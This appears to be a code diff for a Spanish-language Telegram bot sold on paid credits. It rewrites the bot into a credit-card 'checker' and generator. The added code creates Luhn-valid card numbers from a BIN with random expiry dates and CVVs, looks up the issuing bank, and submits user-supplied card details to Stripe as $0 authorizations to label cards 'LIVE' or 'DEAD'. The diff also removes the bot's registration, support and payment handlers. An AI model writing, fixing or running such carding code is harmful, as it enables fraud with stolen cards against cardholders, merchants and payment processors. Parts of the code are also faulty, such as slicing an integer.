@@ -385,115 +385,279 @@ def delete_user_admin(message):
             eliminar_usuario_db(target_id)
 
 # ==========================================
-# PARTE 4: COMANDOS PГъBLICOS, MANEJADOR DE BOTONES INLINE CONGELADO INTEGRO Y INFINITY POLLING
+# PARTE 4: NUEVA LÓGICA REAL (CORREGIDA Y ROBUSTA)
 # ==========================================
-@bot.message_handler(commands=['register'])
-def register_user(message):
-    user_id = message.from_user.id
-    tg_username = message.from_user.username or 'Usuario'
-    args = message.text.split()
-    if verificar_registro(user_id):
-        bot.reply_to(message, "\U0001F911 Ya estГЎs registrado.")
-        return
-    if len(args) < 2: 
-        return
-    alias_deseado = args[-1]
-    registrar_usuario_manual(user_id, alias_deseado, tg_username)
-    bot.reply_to(message, f"\U0001F509 <b>В¡REGISTRO COMPLETADO!</b>\n\U0001F451 Bienvenido: <code>{alias_deseado}</code>", parse_mode="HTML")
 
-@bot.message_handler(commands=['credits', 'bal'])
-def show_credits(message):
-    datos = verificar_registro(message.from_user.id)
-    if not datos: 
-        return
-    alias, creditos, rango = datos[0], datos[1], datos[2]
-    bot.reply_to(message, f"\U0001F451 <b>CUENTA</b>\n\U0001F451 Alias: <code>{alias}</code>\n\U0001F911 Saldo: <code>{creditos}</code> crГ©ditos\n\U0001F531 Rango: <b>{rango}</b>", parse_mode="HTML")
+class RealCardGateway:
+    def __init__(self):
+        self.session = requests.Session()
+        self.session.headers.update({'User-Agent': ua.random})
+        
+    def fetch_bin_info(self, bin_number):
+        """Obtiene datos reales del banco usando binlist.net"""
+        try:
+            if bin_number in LOCAL_BINS:
+                return LOCAL_BINS[bin_number]
+            
+            resp = requests.get(f"https://api.binlist.net/{bin_number}", timeout=5)
+            if resp.status_code == 200:
+                data = resp.json()
+                bank = data.get('bank', {})
+                country = data.get('country', {})
+                flag = country.get('emoji', '\U0001F30D')
+                bank_name = bank.get('name', 'Desconocido')
+                
+                # Determinar marca automáticamente si no está en LOCAL
+                brand = "Visa" if bin_number.startswith('4') else "Mastercard"
+                if 'mastercard' in bin_number[:6] or bin_number.startswith('5'): brand = "Mastercard"
+                
+                LOCAL_BINS[bin_number] = {
+                    "brand": brand,
+                    "type": bank.get('type', 'Credit'),
+                    "bank": bank_name,
+                    "country": country.get('name', 'Global'),
+                    "flag": flag
+                }
+                return LOCAL_BINS[bin_number]
+        except:
+            pass
+        
+        brand = "Visa" if bin_number.startswith('4') else "Mastercard"
+        return {"brand": brand, "type": "Credit", "bank": "Banco Externo", "country": "Global", "flag": "\U0001F30D"}
 
-@bot.message_handler(commands=['start'])
-def send_welcome(message):
-    datos = verificar_registro(message.from_user.id)
-    if datos:
-        alias, creditos, rango = datos[0], datos[1], datos[2]
-        markup = InlineKeyboardMarkup()
-        btn_comandos = InlineKeyboardButton("\U0001F4D1 Ver Herramientas", callback_data="abrir_menu_comandos")
-        btn_recargar = InlineKeyboardButton("\U0001F911 Comprar CrГ©ditos", callback_data="abrir_menu_recargar")
-        markup.add(btn_comandos, btn_recargar)
-        bot.reply_to(message, f"\U0001F44B <b>В¡Hola de nuevo, {alias}!</b>\n\n\U0001F451 Bienvenido a la central de simulaciГіn.\n\U0001F911 Saldo: <code>{creditos}</code> crГ©ditos\n\U0001F531 Rango: <code>{rango}</code>\n\n\U0001F447 <i>Selecciona una opciГіn del panel interactivo:</i>", parse_mode="HTML", reply_markup=markup)
-    else:
-        bot.reply_to(message, "\U0001F44B <b>В¡BIENVENIDO!</b>\n\U0001F45B RegГ­strate con: <code>/register tu_nombre</code>", parse_mode="HTML")
+    def check_card_live(self, cc, mes, ano, cvv):
+        """
+        Ejecuta una AUTORIZACIÓN REAL de $0.00.
+        CORRECCIÓN: Limpia y valida la entrada antes de enviar.
+        """
+        try:
+            # 1. Limpieza de entrada
+            mes = int(str(mes).zfill(2)) # Asegura MM (ej: 5 -> 05)
+            ano = int(str(ano).zfill(2))[-2:] # Asegura YY (ej: 2026 -> 26)
+            
+            # Validación básica de fecha
+            if mes < 1 or mes > 12:
+                return {"status": "DEAD", "msg": "Fecha Inválida (Mes)", "code": "invalid_expiry", "bank": "Unknown", "country": "Unknown", "brand": "Unknown"}
 
-@bot.callback_query_handler(func=lambda call: True)
-def callback_listener_buttons(call):
-    try: 
-        bot.answer_callback_query(call.id)
-    except: 
-        pass
-    mensaje_clonado = call.message
-    mensaje_clonado.from_user.id = call.from_user.id
-    if call.data == "abrir_menu_comandos": 
-        show_public_commands(mensaje_clonado)
-    elif call.data == "abrir_menu_recargar": 
-        dual_recharge_menu(mensaje_clonado)
+            # 2. Crear PaymentIntent
+            intent = stripe.PaymentIntent.create(
+                amount=0,
+                currency="usd",
+                payment_method_data={
+                    "card": {
+                        "number": cc,
+                        "exp_month": mes,
+                        "exp_year": ano,
+                        "cvc": cvv,
+                    },
+                    "billing_details": {
+                        "name": "Test"
+                    }
+                },
+                description="CC Validation",
+                # Evitamos que intente cobrar realmente si el formato es raro
+                capture_method="manual" 
+            )
+            
+            # Si llega aquí, la tarjeta fue aceptada por la estructura
+            if intent.status in ["succeeded", "requires_payment_method", "requires_action"]: 
+                return {
+                    "status": "LIVE",
+                    "msg": "Valid / Live",
+                    "bank": "Live Bank",
+                    "country": "Unknown",
+                    "brand": "Unknown"
+                }
+            else:
+                return {
+                    "status": "LIVE",
+                    "msg": "Processed",
+                    "bank": "Live Bank",
+                    "country": "Unknown",
+                    "brand": "Unknown"
+                }
 
-@bot.message_handler(commands=['comandos', 'help'])
-def show_public_commands(message):
-    if not verificar_registro(message.from_user.id): 
-        return
-    bot.reply_to(message, "\U0001F4D1 <b>HERRAMIENTAS</b>\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\U0001F4ED <code>/chk CARD</code>\n\U0001F911 <code>/gen BIN</code>\n\U0001F531 <code>/bin BIN</code>\n\U0001F911 <code>/credits</code>\n\U0001F911 <code>/recargar</code>\n\U0001F4D1 <code>/soporte TU_MENSAJE</code>", parse_mode="HTML")
+        except stripe.error.CardError as e:
+            body = e.json_body
+            err = body.get('error', {})
+            decline_code = err.get('code', 'unknown')
+            decline_msg = err.get('message', 'Declined')
+            
+            # Mapeo de errores comunes
+            status_map = {
+                "insufficient_funds": "Sin Fondos",
+                "lost_card": "Tarjeta Perdida",
+                "stolen_card": "Tarjeta Robada",
+                "expired_card": "Caducada",
+                "incorrect_cvc": "CVV Incorrecto",
+                "incorrect_number": "Número Inválido",
+                "generic_decline": "Declinada",
+                "do_not_honor": "No Honrar",
+                "pickup_card": "Retirar Tarjeta"
+            }
+            
+            final_msg = status_map.get(decline_code, decline_msg)
 
-@bot.message_handler(commands=['recargar', 'buy'])
-def dual_recharge_menu(message):
-    if not verificar_registro(message.from_user.id): 
-        return
-    bot.reply_to(message, f"\U0001F911 <b>PASARELA MULTIPAGO</b>\n\u25C8 Bizum al: <code>600123456</code>\n\u2753 Reclama Bizum: <code>/claim_bizum CODIGO</code>", parse_mode="HTML")
+            return {
+                "status": "DEAD",
+                "msg": f"{decline_code} - {final_msg}",
+                "code": decline_code,
+                "bank": "Bank",
+                "country": "Unknown"
+            }
+        except stripe.error.InvalidRequestError as e:
+            # Aquí es donde fallaba tu código anterior (formato fecha)
+            return {
+                "status": "DEAD",
+                "msg": f"Formato Inválido: {str(e)}",
+                "code": "invalid_request",
+                "bank": "Unknown",
+                "country": "Unknown",
+                "brand": "Unknown"
+            }
+        except Exception as e:
+            return {
+                "status": "DEAD",
+                "msg": f"Error API: {str(e)}",
+                "code": "api_error",
+                "bank": "Unknown",
+                "country": "Unknown",
+                "brand": "Unknown"
+            }
 
-@bot.message_handler(commands=['soporte', 'contact'])
-def contact_support_team(message):
-    user_id = message.from_user.id
-    args = message.text.split(maxsplit=1)
-    datos_usuario = verificar_registro(user_id)
-    if not datos_usuario: 
-        return
-    if len(args) < 2:
-        bot.reply_to(message, "\U0001F4ED <b>Uso correcto:</b> <code>/soporte Tu mensaje aquГ­</code>", parse_mode="HTML")
-        return
-    mensaje_soporte = args[-1]
-    alias = datos_usuario[0]
-    bot.reply_to(message, "\U0001F4F9 <b>В¡Ticket Enviado!</b> Tu mensaje ha sido transmitido de forma encriptada al Staff de guardia.", parse_mode="HTML")
-    
-    grupo_staff_privado = recuperar_grupo_staff_db() or 5203992513
-    texto_soporte_staff = f"\U0001F4F0 <b>В¡NUEVO TICKET DE SOPORTE!</b>\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\U0001F451 Usuario: <code>{alias}</code> (ID: <code>{user_id}</code>)\n\U0001F91C {mensaje_soporte}"
-    try: 
-        bot.send_message(grupo_staff_privado, texto_soporte_staff, parse_mode="HTML")
-    except Exception as e:
-        print(f"\U0001F6A8 Error en vivo de la API de Telegram al enviar /soporte al canal STAFF: {e}")
+CARD_GATEWAY = RealCardGateway()
 
-@bot.message_handler(commands=['claim_bizum'])
-def claim_bizum_ticket(message):
-    user_id = message.from_user.id
-    args = message.text.split()
-    datos_usuario = verificar_registro(user_id)
-    if not datos_usuario or len(args) < 2: 
-        return
-    codigo_operacion = args[-1]
-    chat_origen_exacto = message.chat.id
-    alias = datos_usuario[0]
-    bot.reply_to(message, "\u23F3 Ticket enviado al Staff... Esperando verificaciГіn bancaria.")
-    
-    grupo_staff_privado = recuperar_grupo_staff_db() or 5203992513
-    texto_alerta_admin = (
-        f"\U0001F6A8 <b>BIZUM RECIBIDO</b>\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n"
-        f"\U0001F451 Cliente: {alias} (ID: <code>{user_id}</code>)\n"
-        f"\U0001F4F6 Ticket: <code>{codigo_operacion}</code>\n"
-        f"\U0001F4F0 Chat Origen: <code>{chat_origen_exacto}</code>\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n"
-        f"\U0001F449 <b>Copiar resoluciГіn:</b>\n"
-        f"\u2705 <code>/aprobar_bizum {user_id} 100 {chat_origen_exacto}</code>\n"
-        f"\U0001F911 <code>/rechazar_bizum {user_id} {chat_origen_exacto}</code>"
-    )
-    try: 
-        bot.send_message(grupo_staff_privado, texto_alerta_admin, parse_mode="HTML")
-    except Exception as e:
-        print(f"\U0001F6A8 Error en vivo de la API de Telegram al enviar /claim_bizum al canal STAFF: {e}")
+# ======================
+# HANDLERS REESCRITOS
+# ======================
+
+@bot.message_handler(regexp=r'(?i)^[!/]gen')
+def generate_cards(message):
+    if not check_user_access(message, cost=1): return
+    try:
+        input_data = message.text
+        bin_match = re.findall(r'\d+', input_data)
+        if not bin_match:
+            bot.reply_to(message, "\U0001F911 Uso correcto: /gen 400022")
+            return
+        bin_number = "".join(bin_match)[:6]
+        if len(bin_number) < 6:
+            bot.reply_to(message, "\U0001F6D1 \U0001F911 El BIN debe tener al menos 6 digitos.")
+            return
+        bin_base = bin_number
+        generated_list = []
+        while len(generated_list) < 10:
+            cc = bin_base
+            while len(cc) < 15: 
+                cc += str(random.randint(0, 9))
+            for last_digit in range(10):
+                test_cc = cc + str(last_digit)
+                if luhn_check(test_cc) and test_cc not in generated_list:
+                    mes = str(random.randint(1, 12)).zfill(2)
+                    ano = str(random.randint(2026, 2031))
+                    cvv = str(random.randint(100, 999))
+                    generated_list.append(f"{test_cc}|{mes}|{ano}|{cvv}")
+                    break
+        cards_output = "\n".join(generated_list)
+        creditos_actuales = get_user_credits(message.from_user.id)
+        bot.reply_to(message, f"\U0001F911 Tarjetas Generadas (BIN: {bin_number})\n\n{cards_output}\n\nSaldo: {creditos_actuales} creditos.")
+    except Exception as e: 
+        bot.reply_to(message, f"\U0001F6D1 \U0001F911 Error al generar: {str(e)}")
+
+@bot.message_handler(regexp=r'(?i)^[!/]bin')
+def check_bin_standalone(message):
+    if not check_user_access(message, cost=1): return
+    try:
+        input_data = message.text
+        bin_match = re.findall(r'\d+', input_data)
+        if not bin_match:
+            bot.reply_to(message, "\U0001F911 Uso correcto: /bin 400022")
+            return
+        bin_number = "".join(bin_match)[:6]
+        bot.send_chat_action(message.chat.id, 'typing')
+        
+        if bin_number in LOCAL_BINS:
+            bin_data = LOCAL_BINS[bin_number]
+        else:
+            bin_data = CARD_GATEWAY.fetch_bin_info(bin_number)
+
+        brand = bin_data.get("brand", "Visa")
+        card_type = bin_data.get("type", "Credit")
+        bank_name = bin_data.get("bank", "Desconocido")
+        country_name = bin_data.get("country", "Global")
+        flag = bin_data.get("flag", "\U0001F30D")
+
+        creditos_actuales = get_user_credits(message.from_user.id)
+        bot.reply_to(message, f"\U0001F531 BIN: {bin_number}\nFranquicia: {brand}\nTipo: {card_type}\nBanco: {bank_name}\nPais: {country_name} {flag}\nSaldo: {creditos_actuales}.")
+    except Exception as e: 
+        bot.reply_to(message, f"\U0001F6D1 \U0001F911 Error: {str(e)}")
+
+@bot.message_handler(regexp=r'(?i)^[!/]chk')
+def check_card(message):
+    if not check_user_access(message, cost=1): return
+    try:
+        loading_msg = bot.reply_to(message, "\U0001F50D <b>Conectando con Gateway Real (Stripe)...</b>", parse_mode="HTML")
+        
+        input_data = message.text
+        # Extraer NÚMEROS. Si el usuario puso CARD|MM|YY|CVV, esto separa todo en dígitos.
+        cards = re.findall(r'\d+', input_data)
+        
+        # Necesitamos al menos 4 grupos de números (Card, MM, YY, CVV)
+        if len(cards) < 4: 
+            bot.edit_message_text("\U0001F4ED Uso incorrecto. Formato: /chk CARD|MM|AA|CVV", message.chat.id, loading_msg.message_id)
+            return
+
+        cc = cards[0]
+        mes = cards[1]
+        ano = cards[2]
+        cvv = cards[3]
+
+        # Validar que la tarjeta tenga longitud estándar (16 dígitos) para Stripe
+        if len(cc) != 16:
+            bot.edit_message_text(f"\U0001F911 <b>Tarjeta de {len(cc)} dígitos (Stripe prefiere 16)</b>\nIntentando check...", message.chat.id, loading_msg.message_id, parse_mode="HTML")
+
+        is_luhn_valid = luhn_check(cc)
+        if not is_luhn_valid:
+            bot.edit_message_text("\U0001F911 <b>DEAD</b> (Luhn Fail - Número Inexistente)", message.chat.id, loading_msg.message_id, parse_mode="HTML")
+            return
+
+        bin_number = cc[:6]
+        bin_data = CARD_GATEWAY.fetch_bin_info(bin_number)
+        brand = bin_data.get("brand", "Unknown")
+        bank_name = bin_data.get("bank", "Unknown")
+        country_name = bin_data.get("country", "Unknown")
+        flag = bin_data.get("flag", "\U0001F30D")
+
+        # Ejecutar Check
+        result = CARD_GATEWAY.check_card_live(cc, mes, ano, cvv)
+        
+        status_emoji = "\u2705" if result['status'] == "LIVE" else "\U0001F911"
+        status_color = "\U0001F7E2" if result['status'] == "LIVE" else "\U0001F534"
+
+        final_status = status_emoji + " " + result['status'].upper()
+        details = result['msg']
+
+        resultado_visual = (
+            f"\U0001F911 <b>RESULTADO DEL CHECKER</b>\n"
+            f"\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n"
+            f"\U0001F50D <b>Card:</b> <code>{cc}</code>\n"
+            f"\U0001F4C5 <b>Exp:</b> <code>{mes}|{ano}</code>\n"
+            f"\U0001F50F <b>CVV:</b> <code>{cvv}</code>\n"
+            f"\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n"
+            f"{status_color} <b>Estado:</b> {final_status}\n"
+            f"\U0001F3F7\uFE0F <b>Gateway:</b> Stripe API (Real)\n"
+            f"\U0001F451 <b>Franquicia:</b> {brand}\n"
+            f"\U0001F3E6 <b>Banco:</b> {bank_name}\n"
+            f"\U0001F4F0 <b>País:</b> {country_name} {flag}\n"
+            f"\U0001F53A <b>Motivo:</b> {details}\n"
+            f"\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n"
+            f"\U0001F451 <b>Tu Saldo:</b> <code>{get_user_credits(message.from_user.id)}</code>"
+        )
+
+        bot.edit_message_text(resultado_visual, message.chat.id, loading_msg.message_id, parse_mode="HTML")
+
+    except Exception as e: 
+        bot.edit_message_text(f"\U0001F6D1 \U0001F911 Error en el checker: {str(e)}", message.chat.id, loading_msg.message_id)
 
 # ==========================================
 # NUEVA LГ“GICA REAL: GATEWAY STRIPE Y CHECKER PROFESIONAL (CORREGIDO)
